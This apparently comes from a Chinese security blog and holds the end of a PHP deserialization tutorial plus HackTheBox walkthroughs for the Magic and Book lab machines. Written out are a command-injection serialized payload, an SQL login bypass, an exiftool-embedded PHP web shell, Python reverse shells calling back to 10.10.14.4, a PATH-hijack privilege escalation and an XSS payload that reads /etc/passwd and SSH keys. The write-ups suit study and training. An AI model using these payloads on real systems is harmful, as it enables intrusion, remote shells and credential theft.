$this-&gt;method)来表示，意思就是数组的第一个元素表示是该方法所在的类，第二个元素就是方法名。而且if语句已经限定了method参数必须是echos。再来看看echos这个类方法。 123function echos($host)&#123; system(&quot;echos $host&quot;.$host);&#125; system()函数可以执行系统命令，而且host参数可控，于是判断这里存在命令注入漏洞。于是思路如下： 通过反序列化控制method和args两个成员变量 method必须是echos不然通不过if判断 通过call_user_func_array()函数第一个参数调用本类中的echos方法，第二个参数给方法传参- 由于echos方法中的system函数的参数是拼接形参的，完成命令注入。 根据顺序，先执行__wakeup再执行__destruct，__wakeup中对参数有一个过滤的处理： 1234567891011function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125;&#125;function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#x27;flag&#x27;,&#x27;&#x27;,$str); return $str;&#125; 可以看到它默认将args变量视为一个数组，对其进行了foreach，然后又对数组中的每个元素送去了waf进行过滤。这表明我们传入的args是一个数组。并且args中不允许出现[&lt;&gt;*;|?\\n ]这些字符，以及flag关键词。 并且echos是一个错误的命令，所以综合以上两点，必须使用&amp;命令连接符。 构造反序列化类： 123456&lt;?phpclass come&#123; private $method = &#x27;echos&#x27;; private $args = array(&#x27;&amp;cat$&#123;IFS&#125;/flag)&#x27;);&#125;echo serialize(new come()); 得到payload： 1O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:5:&quot;echos&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;i:0;s:16:&quot;&amp;cat$&#123;IFS&#125;&#x2F;flag)&quot;;&#125;&#125; 如果PHP版本大于7.0，可以直接把private属性改成public 0x05 Reference 一篇文章带你深入理解PHP反序列化漏洞 php反序列化那些事","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Magic-Walkthrough","date":"2020-04-28T04:47:16.000Z","path":"Target_drone/HackTheBox/15.HTB-Magic-walkthrough/","text":"HTB::Magic Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap exiftool LinEnum.sh SQL Injection mysqldump sysinfo PATH variable 0x03 Pentesting Initial Enueration 端口扫描： 1234567891011121314151617181920212223$ nmap -A -Pn -T4 -p- 10.10.10.185Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-04-23 10:22 EDTStats: 0:10:27 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 22.07% done; ETC: 11:10 (0:36:54 remaining)Warning: 10.10.10.185 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.10.185Host is up (0.34s latency).Not shown: 65455 closed ports, 78 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)| 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)|_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Magic PortfolioService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 6500.05 seconds 常规80端口，进入站点发现有一个Login界面，随便试一下，又是常规的SQL Injection，Burp修改数据，payload万能密码admin' or 1=1--+即可。 登录成功后，有一个上传图片的功能，经过尝试之后发现只能上传固定的图片格式的文件，但是好像没有对图片内容进行检查。随便找一个正常文件，用exiftool工具写入payload： 1exiftool -Comment&#x3D;&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; normal.jpg 更改后缀名： 1mv normal.jpg normal.php.jpg 上传文件后，在主页查看页面源代码，发现上传图片的相对路径是images/uploads/normal.php.jpg，访问该路径发现可以正常回显。 再在url上添加下面内容作为cmd参数，用来执行reverse shell，在本机监听相应的端口： 1python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 注意：这个靶机只有python3的环境 成功拿到www-data权限： 123456789$ nc -lvp 4444listening on [any] 4444 ...10.10.10.185: inverse host lookup failed: Unknown hostconnect to [10.10.14.16] from (UNKNOWN) [10.10.10.185] 58816&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off$ iduid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)$ python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$ Getting User Access 查找敏感文件： 123456789101112131415161718192021222324252627282930313233343536373839404142www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$ cd ..&#x2F;..&#x2F;cd ..&#x2F;..&#x2F;www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ lslsassets db.php5 images index.php login.php logout.php upload.phpwww-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ cat db.php5cat db.php5&lt;?phpclass Database&#123; private static $dbName &#x3D; &#39;Magic&#39; ; private static $dbHost &#x3D; &#39;localhost&#39; ; private static $dbUsername &#x3D; &#39;theseus&#39;; private static $dbUserPassword &#x3D; &#39;iamkingtheseus&#39;; private static $cont &#x3D; null; public function __construct() &#123; die(&#39;Init function is not allowed&#39;); &#125; public static function connect() &#123; &#x2F;&#x2F; One connection through whole application if ( null &#x3D;&#x3D; self::$cont ) &#123; try &#123; self::$cont &#x3D; new PDO( &quot;mysql:host&#x3D;&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname&#x3D;&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword); &#125; catch(PDOException $e) &#123; die($e-&gt;getMessage()); &#125; &#125; return self::$cont; &#125; public static function disconnect() &#123; self::$cont &#x3D; null; &#125;&#125; 有一个配置文件，用户名是theseus，密码是iamkingtheseus，尝试用这个密码切换用户： 12345www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ su theseussu theseusPassword: iamkingtheseussu: Authentication failure 密码错误，这个应该是MySQL数据库的登录密码。当我准备用mysql命令时，提示我apt-get install，但是靶机上明明就运行着MySQL服务， 12345678910111213141516171819202122232425www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ ls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysqlls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysql-rwxr-xr-x 1 root root 3627200 Jan 21 06:10 mysql_config_editor-rwxr-xr-x 1 root root 22558552 Jan 21 06:10 mysql_embedded-rwxr-xr-x 1 root root 5179616 Jan 21 06:10 mysql_install_db-rwxr-xr-x 1 root root 3616952 Jan 21 06:10 mysql_plugin-rwxr-xr-x 1 root root 3784424 Jan 21 06:10 mysql_secure_installation-rwxr-xr-x 1 root root 3653288 Jan 21 06:10 mysql_ssl_rsa_setup-rwxr-xr-x 1 root root 3569976 Jan 21 06:10 mysql_tzinfo_to_sql-rwxr-xr-x 1 root root 4442320 Jan 21 06:10 mysql_upgrade-rwxr-xr-x 1 root root 3799752 Jan 21 06:10 mysqladminlrwxrwxrwx 1 root root 10 Jan 21 06:10 mysqlanalyze -&gt; mysqlcheck-rwxr-xr-x 1 root root 4068280 Jan 21 06:10 mysqlbinlog-rwxr-xr-x 1 root root 3825320 Jan 21 06:10 mysqlcheck-rwxr-xr-x 1 root root 26952 Jan 21 06:10 mysqld_multi-rwxr-xr-x 1 root root 28448 Jan 21 06:10 mysqld_safe-rwxr-xr-x 1 root root 3875176 Jan 21 06:10 mysqldump-rwxr-xr-x 1 root root 7865 Jan 21 06:10 mysqldumpslow-rwxr-xr-x 1 root root 3791912 Jan 21 06:10 mysqlimportlrwxrwxrwx 1 root root 10 Jan 21 06:10 mysqloptimize -&gt; mysqlcheck-rwxr-xr-x 1 root root 4286120 Jan 21 06:10 mysqlpumplrwxrwxrwx 1 root root 10 Jan 21 06:10 mysqlrepair -&gt; mysqlcheck-rwxr-xr-x 1 root root 39016 Jan 12 2018 mysqlreport-rwxr-xr-x 1 root root 3790504 Jan 21 06:10 mysqlshow-rwxr-xr-x 1 root root 3809512 Jan 21 06:10 mysqlslap 找到了 dump MySQL database： 1mysqldump --databases Magic -utheseus -piamkingtheseus 得到用户名和密码admin:Th3s3usW4sK1ng。 再把本机的SSH public key加入到靶机的/home/thesues/.ssh/authenticated_keys，SSH直接登录： 123456789101112131415161718192021$ ssh theseus@10.10.10.185The authenticity of host &#39;10.10.10.185 (10.10.10.185)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;10.10.10.185&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.4 LTS (GNU&#x2F;Linux 5.3.0-42-generic x86_64)* Documentation: https:&#x2F;&#x2F;help.ubuntu.com* Management: https:&#x2F;&#x2F;landscape.canonical.com* Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage* Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch 29 packages can be updated.0 updates are security updates.Your Hardware Enablement Stack (HWE) is supported until April 2023.Last login: Sat Apr 25 22:27:50 2020 from 10.10.14.44theseus@ubuntu:~$ iduid&#x3D;1000(theseus) gid&#x3D;1000(theseus) groups&#x3D;1000(theseus),100(users) Getting Root Access 查找SUID文件： 1234567891011121314151617181920theseus@ubuntu:~&#x2F;.ssh$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;sbin&#x2F;pppd&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;sudo&#x2F;usr&#x2F;bin&#x2F;pkexec&#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils&#x2F;usr&#x2F;bin&#x2F;arping&#x2F;usr&#x2F;bin&#x2F;vmware-user-suid-wrapper&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign...&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;fusermount&#x2F;bin&#x2F;sysinfo&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;su&#x2F;bin&#x2F;ping 可以发现一个不太寻常SUID：sysinfo 123theseus@ubuntu:~$ file &#x2F;bin&#x2F;sysinfofile &#x2F;bin&#x2F;sysinfo&#x2F;bin&#x2F;sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped 运行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768theseus@ubuntu:~$ sysinfosysinfo&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hardware Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;H&#x2F;W path Device Class Description&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; system VMware Virtual Platform&#x2F;0 bus 440BX Desktop Reference Platform&#x2F;0&#x2F;0 memory 86KiB BIOS&#x2F;0&#x2F;1 processor AMD EPYC 7401P 24-Core Processor&#x2F;0&#x2F;1&#x2F;0 memory 16KiB L1 cache&#x2F;0&#x2F;1&#x2F;1 memory 16KiB L1 cache&#x2F;0&#x2F;100&#x2F;17.5 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;17.6 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;17.7 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.1 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.2 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.3 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.4 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.5 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.6 bridge PCI Express Root Port&#x2F;0&#x2F;100&#x2F;18.7 bridge PCI Express Root Port&#x2F;0&#x2F;46 scsi0 storage &#x2F;0&#x2F;46&#x2F;0.0.0 &#x2F;dev&#x2F;cdrom disk VMware IDE CDR00&#x2F;1 system &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk &#x2F;dev&#x2F;loop0: 3.7 MiB, 3825664 bytes, 7472 sectorsUnits: sectors of 1 * 512 &#x3D; 512 bytesSector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytesI&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytesDisk &#x2F;dev&#x2F;loop1: 54.5 MiB, 57151488 bytes, 111624 sectorsUnits: sectors of 1 * 512 &#x3D; 512 bytesSector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytesI&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytesDisk &#x2F;dev&#x2F;loop11: 3.7 MiB, 3862528 bytes, 7544 sectorsUnits: sectors of 1 * 512 &#x3D; 512 bytesSector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytesI&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;CPU Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;processor : 0vendor_id : AuthenticAMDcpu family : 23model : 1model name : AMD EPYC 7401P 24-Core Processorstepping : 2microcode : 0x8001230cpuid level : 13wp : yesflags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succorbugs : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypassbogomips : 4000.00TLB size : 2560 4K pagesclflush size : 64cache_alignment : 64address sizes : 43 bits physical, 48 bits virtualpower management:&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;MEM Usage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; total used free shared buff&#x2F;cache availableMem: 3.8G 566M 2.4G 4.0M 929M 3.1GSwap: 947M 0B 947M sysinfo显示出来的内容主要分为四个部分 Hardware Info Disk Info CPU Info Mem Usage 查阅了Forum上前辈们给的提示，发现sysinfo是四个Linux命令的组合调用： Hardware Info = lshw -short Disk Info = fdisk -l CPU Info = cat /proc/cpuinfo Mem Usage = free -h 既然sysinfo调用的是原生的Linux命令，那么我们就可以通过改变PATH变量，创建一个内容由自己决定，文件名为上面四种任意一个的“二进制文件”，具体而言： 在/tmp/magic目录下创建一个fdisk文件，然后向其中写入reverse shell： 1234theseus@ubuntu:&#x2F;tmp&#x2F;magic$ touch fdisktouch fdisktheseus@ubuntu:&#x2F;tmp&#x2F;magic$ echo python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk&lt;(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; &gt; fdisk 更改权限755 1theseus@ubuntu:&#x2F;tmp&#x2F;magic$ chmod fdisk 755 然后将/tmp/magic目录写到PATH环境变量中： 12theseus@ubuntu:&#x2F;tmp&#x2F;magic$ export PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATHexport PATH&#x3D;&#x2F;tmp&#x2F;magic:$PATH 更详细的解释可以看这篇文章：https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ 这样就达到了目的，即sysinfo会去执行/tmp/magic目录下的fdisk 本机监听1234端口，靶机运行sysinfo命令： 12345Ncat: Connection from 10.10.10.185:45410.python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;root@ubuntu:&#x2F;tmp# whoamiwhoamiroot 0x04 Summary 利用SQL Injection登录上传图片页面 使用exiftool工具向正常图片添加web shell 上传图片获得www-data的reverse shell 从db.php5获得MySQL数据库的登录名和密码 使用mysqldump备份数据库，得到网站的admin密码，即用户theseus的su密码 分析sysinfo的输出信息 使用PATH变量提权","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HTB::Book-walkthrough","date":"2020-04-15T02:50:14.000Z","path":"Target_drone/HackTheBox/14.HTB-Book-walkthrough/","text":"HTB::Book Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap dirb pspy SQL Truncate XSS LFI logrotate exp 0x03 Pentesting Initial Enumeration 端口扫描 123456789101112131415161718192021# Nmap 7.80 scan initiated Fri Apr 3 22:48:24 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.176Nmap scan report for 10.10.10.176Host is up (0.43s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)| 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)|_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | &#x2F;: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: LIBRARY - Read | Learn | Have FunService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Fri Apr 3 22:49:38 2020 -- 1 IP address (1 host up) scanned in 73.80 seconds 路径扫描 1234567891011121314151617181920212223242526272829303132333435363738$ dirb http:&#x2F;&#x2F;10.10.10.176 -----------------DIRB v2.22By The Dark Raver----------------- START_TIME: Tue Apr 14 02:23:14 2020URL_BASE: http:&#x2F;&#x2F;10.10.10.176&#x2F;WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt----------------- GENERATED WORDS: 4612---- Scanning URL: http:&#x2F;&#x2F;10.10.10.176&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F;&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F;+ http:&#x2F;&#x2F;10.10.10.176&#x2F;index.php (CODE:200|SIZE:6800)+ http:&#x2F;&#x2F;10.10.10.176&#x2F;server-status (CODE:403|SIZE:277)---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F;+ http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;index.php (CODE:200|SIZE:6291)&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F; -------- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F; -------- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F; -------- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F;---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F; ---------------------END_TIME: Tue Apr 14 04:45:39 2020DOWNLOADED: 32284 - FOUND: 4 Getting User Access 查看80端口，有一个登录和注册页面，我们先正常注册和登录之后进站点看看，有三个点值得注意： Contact Us界面表明了有一个管理员账号admin@book.htb View Profile界面表明了现在账号的权限是User Collections界面有一个上传功能 首先尝试能不能垂直越权，用admin@book.htb注册账号，Burp拦截请求 1234567891011121314POST &#x2F;index.php HTTP&#x2F;1.1Host: 10.10.10.176User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflateReferer: http:&#x2F;&#x2F;10.10.10.176&#x2F;index.phpContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 49Connection: closeCookie: PHPSESSID&#x3D;mq1sob5pmstq0i55csvmlafcreUpgrade-Insecure-Requests: 1name&#x3D;admin&amp;email&#x3D;admin@book.htb&amp;password&#x3D;123321 并且查看注册页面源码发现email字段有JS验证 123456789101112function validateForm() &#123; var x = document.forms[&quot;myForm&quot;][&quot;name&quot;].value; var y = document.forms[&quot;myForm&quot;][&quot;email&quot;].value; if (x == &quot;&quot;) &#123; alert(&quot;Please fill name field. Should not be more than 10 characters&quot;); return false; &#125; if (y == &quot;&quot;) &#123; alert(&quot;Please fill email field. Should not be more than 20 characters&quot;); return false; &#125;&#125; 这里的越权方式：在admin@book.htb后面用空格填充至20个字符在加上一个任意字符，一共21个字符。 1name&#x3D;admin&amp;email&#x3D;admin@book.htb C&amp;password&#x3D;123321 注册成功后，用admin@book.htb登录站点，发现自己的身份仍然是User，转而到http://10.10.10.176/admin页面登录，然而结果是Nope，猜测一下原因可能是因为name字段重复，再重新走一遍注册流程： 1name&#x3D;admin2&amp;email&#x3D;admin@book.htb C&amp;password&#x3D;123321 登录admin站点成功。接着开始尝试Collections模块，在用户端上传一个pdf文件，内容随意 在管理面板中下载Collections PDF 可以看到刚刚上传的pdf文件 梳理一下逻辑，我们提供的数据可以呈现在pdf中，因此我们可以通过XSS提取本地文件。Google一下LFI XSS，Noob-ninja已经提供了相关的利用方式：https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html payload： 1&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; 上传之后再从管理面板下载Collections PDF 成功拿到一个用户名reader，再去主目录拿SSH key payload： 1&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt; 但是PDF显示有问题，用pdfminner.six工具转换成text https://github.com/pdfminer/pdfminer.six 1$ python3 tools&#x2F;pdf2text.py 68498.pdf &gt; id_rsa SSH reader login 12345678910111213141516171819202122232425262728293031323334$ssh -i id_rsa.txt reader@book.htbThe authenticity of host &#39;book.htb (10.10.10.176)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9&#x2F;eAeT&#x2F;9wUfoQQk.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;book.htb&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.2 LTS (GNU&#x2F;Linux 5.4.1-050401-generic x86_64) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage System information as of Mon Mar 2 15:30:16 UTC 2020 System load: 0.28 Processes: 194 Usage of &#x2F;: 27.1% of 19.56GB Users logged in: 1 Memory usage: 39% IP address for ens33: 10.10.10.176 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch114 packages can be updated.0 updates are security updates.Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Apr 14 06:05:21 2020 from 10.10.17.235reader@book:~$ iduid&#x3D;1000(reader) gid&#x3D;1000(reader) groups&#x3D;1000(reader)reader@book:~$ lsbackups lse.sh user.txt Getting Root Access 主目录下有一个backups文件夹： 123456789reader@book:~$ cd backups&#x2F;reader@book:~&#x2F;backups$ ls -latotal 12drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..-rw-r--r-- 1 reader reader 0 Jan 29 13:05 access.log-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1reader@book:~&#x2F;backups$ cat access.log.1 192.168.0.104 - - [29&#x2F;Jun&#x2F;2019:14:39:55 +0000] &quot;GET &#x2F;robbie03 HTTP&#x2F;1.1&quot; 404 446 &quot;-&quot; &quot;curl&quot; 用pspy监控靶机运行的服务： 12342020&#x2F;04&#x2F;14 10:17:39 CMD: UID&#x3D;0 